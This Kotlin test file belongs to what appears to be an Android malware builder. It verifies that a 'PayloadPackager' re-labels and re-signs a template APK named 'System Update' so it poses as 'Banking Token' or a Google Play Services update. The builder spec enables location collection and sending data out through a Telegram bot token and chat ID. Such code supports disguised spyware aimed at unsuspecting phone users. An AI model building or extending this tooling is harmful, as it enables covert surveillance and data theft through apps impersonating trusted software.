package com.vector.console.data.payload

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

/**
 * The manifest rewriter is the one part of the packager that touches a format nobody documents in
 * one place, so these tests run against the real template manifest rather than a hand-made
 * fixture. If the template is rebuilt with a different aapt2 the tests fail loudly instead of the
 * builder silently shipping an APK with the wrong label.
 */
class AxmlTest {

    private fun template(): ByteArray =
        File("src/main/assets/payload/template.apk").readBytes()

    private fun manifestOf(apk: ByteArray): ByteArray {
        val archive = ZipArchive.read(ZipArchive.stripSigningBlock(apk))
        val entry = archive.find("AndroidManifest.xml")!!
        return if (entry.method == ZipArchive.METHOD_DEFLATE) {
            java.util.zip.Inflater(true).run {
                setInput(entry.payload)
                val out = java.io.ByteArrayOutputStream()
                val buffer = ByteArray(8192)
                while (!finished()) {
                    val n = inflate(buffer)
                    if (n == 0 && needsInput()) break
                    out.write(buffer, 0, n)
                }
                end()
                out.toByteArray()
            }
        } else {
            entry.payload
        }
    }

    @Test
    fun `template manifest pool parses`() {
        val strings = Axml.strings(manifestOf(template()))
        assertNotNull(strings)
        assertTrue(strings!!.contains("com.mobilesvc.agent"))
        assertTrue(strings.contains("System Update"))
    }

    @Test
    fun `label is rewritten and the package is not`() {
        val spec = PayloadSpec(
            label = "Banking Token",
            collectLocation = true,
            transport = PayloadSpec.Transport.TELEGRAM,
            telegramToken = "123456789:" + "A".repeat(35),
            telegramChatId = "1"
        )
        val result = PayloadPackager.build(
            template(),
            spec,
            ApkSignerV2.generateCredentials()
        )
        val strings = Axml.strings(manifestOf(result.apk))
        assertNotNull(strings)
        assertTrue(strings!!.contains("Banking Token"))
        assertTrue(!strings.contains("System Update"))
        // The package name is a DEX fact, not a manifest fact — it must survive untouched.
        assertTrue(strings.contains("com.mobilesvc.agent"))
    }

    @Test
    fun `label of a different length keeps the manifest readable`() {
        // Growing the pool shifts every following chunk, which is exactly where an offset bug
        // would show up as a manifest that parses to nothing.
        val long = PayloadSpec(
            label = "Google Play Services Update Component",
            transport = PayloadSpec.Transport.TELEGRAM,
            telegramToken = "123456789:" + "A".repeat(35),
            telegramChatId = "1"
        )
        val short = long.copy(label = "Sync")
        val signer = ApkSignerV2.generateCredentials()

        listOf(long, short).forEach { spec ->
            val result = PayloadPackager.build(template(), spec, signer)
            val strings = Axml.strings(manifestOf(result.apk))
            assertNotNull(strings)
            assertTrue(strings!!.contains(spec.label))
            assertTrue(strings.contains("com.mobilesvc.agent"))
        }
    }

    @Test
    fun `non-manifest input is returned untouched`() {
        val junk = ByteArray(64) { 0x41 }
        assertEquals(junk.toList(), Axml.rewriteStrings(junk, mapOf("a" to "b")).toList())
    }
}
